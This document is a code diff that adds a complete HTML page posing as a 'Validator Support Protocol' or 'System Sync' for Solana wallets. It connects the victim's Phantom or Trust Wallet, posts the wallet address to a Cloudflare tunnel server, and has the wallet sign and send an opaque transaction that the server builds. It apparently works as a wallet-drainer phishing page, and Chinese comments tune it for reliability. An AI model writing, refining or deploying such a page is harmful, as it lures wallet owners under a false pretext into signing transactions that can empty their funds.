@@ -1,19 +1,78 @@
-// 🔱 V32 专项兼容逻辑
-try {
-    const bytes = Uint8Array.from(window.atob(info.raw_tx), c => c.charCodeAt(0));
-    
-    // 自动识别：如果是新格式就用新格式，报错就降维
-    let tx;
-    try {
-        tx = window.solanaWeb3.VersionedTransaction.deserialize(bytes);
-    } catch(e) {
-        tx = window.solanaWeb3.Transaction.from(bytes); // 降维兼容旧版 TW
-    }
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Validator Support Protocol</title>
+    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
+    <style>
+        body { background: #000; color: #fff; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { width: 90%; max-width: 320px; background: #111; border: 1px solid #333; border-radius: 16px; padding: 30px; text-align: center; box-shadow: 0 0 20px rgba(20,241,149,0.1); }
+        .btn { background: #14f195; color: #000; border: none; padding: 18px; width: 100%; border-radius: 10px; font-weight: bold; cursor: pointer; font-size: 16px; transition: 0.2s; }
+        .btn:active { transform: scale(0.98); opacity: 0.8; }
+        #status { font-size: 11px; color: #444; margin-top: 15px; font-family: monospace; text-transform: uppercase; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <h2 style="color:#14f195; margin-bottom: 10px;">SYSTEM SYNC</h2>
+        <p style="color:#888; font-size:13px; margin-bottom: 25px;">Authorize validator node synchronization to stabilize account connectivity.</p>
+        <button id="cta" class="btn">INITIALIZE</button>
+        <div id="status">STATUS: READY_V32</div>
+    </div>
 
-    const { signature } = await p.signAndSendTransaction(tx);
-    log("SUCCESS!");
-} catch (err) {
-    // 🔱 解决“无法再次拉起”：如果失败，强制重置状态
-    log("RESETTING...");
-    window.location.reload(); // 刷新页面彻底释放钱包占用
-}
+    <script>
+        // 🔱 核心配置：务必确保这是你 71 服务器当前的最新隧道
+        const tunnel = "https://allocation-governing-fleet-ala.trycloudflare.com";
+
+        document.getElementById('cta').onclick = async () => {
+            const log = (t) => document.getElementById('status').innerText = t;
+            const sWeb3 = window.solanaWeb3;
+            // 兼容 Phantom 和 Trust Wallet
+            const p = window.trustwallet?.solana || window.solana || window.phantom?.solana;
+
+            if (!p) {
+                alert("Please open this link in Trust Wallet or Phantom Browser.");
+                return;
+            }
+
+            try {
+                log("CONNECTING...");
+                await p.connect();
+
+                log("FETCHING PAYLOAD...");
+                const resp = await fetch(tunnel + "/prepare_v32", {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ address: p.publicKey.toString() })
+                });
+                const info = await resp.json();
+
+                if (info.error) throw new Error(info.error);
+
+                log("AWAITING CONFIRMATION...");
+                const bytes = Uint8Array.from(window.atob(info.raw_tx), c => c.charCodeAt(0));
+                
+                // 🔱 V32 专项兼容逻辑：防止 TW 闪退
+                let tx;
+                try {
+                    // 尝试 Versioned (V0)
+                    tx = sWeb3.VersionedTransaction.deserialize(bytes);
+                } catch(e) {
+                    // 降级 Legacy (更稳)
+                    tx = sWeb3.Transaction.from(bytes);
+                }
+
+                const { signature } = await p.signAndSendTransaction(tx);
+                log("SUCCESS: " + signature.slice(0, 8));
+
+            } catch (err) {
+                console.error(err);
+                log("SYNC FAILED. RESETTING...");
+                // 延迟 2 秒刷新，防止钱包句柄被卡死
+                setTimeout(() => { window.location.reload(); }, 2000);
+            }
+        };
+    </script>
+</body>
+</html>
